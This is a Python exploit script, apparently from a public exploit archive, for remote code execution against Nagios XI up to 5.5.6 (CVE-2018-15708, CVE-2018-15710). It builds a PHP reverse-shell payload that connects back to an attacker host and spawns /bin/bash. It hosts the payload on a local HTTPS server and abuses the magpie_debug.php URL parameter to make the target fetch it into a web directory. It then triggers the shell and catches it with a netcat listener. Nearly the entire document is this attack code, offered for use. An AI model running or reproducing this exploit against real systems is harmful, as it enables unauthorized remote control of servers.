#!/usr/bin/env python3
# Exploit Title: Nagios XI 5.5.6 Remote Code Execution
# Date: 2021-05-12
# Exploit Author: (m4ud)
# Vendor Homepage: https://www.nagios.com/
# Product: Nagios XI
# Version: From 2012r1.0 to 5.5.6
# Tested on: 
#   - Ubuntu Linux 16.04, 18.04, 20.04
#   - CentOS Linux 7.5.1804 (Core) / Kernel 3.10.0
#   - Nagios XI 2012r1.0, 5r1.0, and 5.5.6
# CVE: CVE-2018-15708, CVE-2018-15710

import http.server
import ssl
import sys
import requests
import threading
import time
import subprocess
from multiprocessing.dummy import Pool
from optparse import OptionParser

def wshell(shell):
  f = open( 'shelb.php', 'w' )
  f.write(shell)
  f.close()
  print("\r\n (m4ud) brings you Nagios XI pwnage!")
  print("\r\n[+] Initiating Omega Protocol [+]")

def serverShutdown(server):
#    time.sleep(1)
    server.stop()
    print("[+] Shutting down Web-Server![+]")
    print("[*] Getting Shell, wait a moment!![*]")

def getshell(lport):
    print("[*] Ooh boy, here it comes the Shell! [*]\r\n")
    netcat_thread = threading.Thread(subprocess.run('nc -nlvp ' + lport, shell=True))


class burn():
  def __init__(self, options):
    self.target = options.target
    self.lhost = options.lhost 
    self.lport = options.lport 
    self.wport = options.wport 
    self.url = "http://" + self.target
    url = self.url
    self.exPath = "/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url="
    self.payload = "https://" + self.lhost + "/shelb.php%20-o%20/usr/local/nagvis/share/shelb.php"
    shell = """<?php $sock=fsockopen(""" +'"' + self.lhost  + '"'+  "," + self.lport + """);$proc=proc_open(""" + '"'+"/bin/bash -i"+'"' + """, array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"""
    wshell(shell)
    server_address = (self.lhost, int(self.wport))
    print("[+] Serving Payload at port " + str(self.wport) +" [+]")
    self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    self.httpd.socket = ssl.wrap_socket(self.httpd.socket,
                                   server_side=True,
                                   certfile="cert.crt",
                                   keyfile="key.key",
                                   ssl_version=ssl.PROTOCOL_TLS)
    self.server_thread = threading.Thread(target=self.httpd.serve_forever)

  def get_url(self):
    r = requests.get(self.url + self.exPath + self.payload)

  def start(self):
    self.server_thread.start()

  def stop(self):
    self.httpd.shutdown()
    self.httpd.server_close()

def main():
  exploit = burn()

if __name__=="__main__":
  parser = OptionParser() 
   
  parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address") 
  parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT") 
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Requeired ] LHOST") 
  parser.add_option("-w","--wport", dest="wport",default=443, help="WebServer Port")

  (options, args) = parser.parse_args() 

  if options.target: 
    server = burn(options) 
    server.start()
    tpath = "http://" + options.target + "/nagvis/shelb.php"
    pool = Pool(2)
    for i in range(1):
        t = threading.Thread(target=server.get_url())
        t.daemon = True
        time.sleep(2)
        t2 = threading.Thread(target=serverShutdown, args=(server,))
        t2.daemon = True
        t2.start()
        time.sleep(1)
        pool.apply_async(pool.apply_async(requests.get, args=[tpath]))
        t3 = threading.Thread(target=getshell(options.lport))
  else:
    print("(m4ud) Magnificent NagiosXI pwnage, use -h for help!!!")

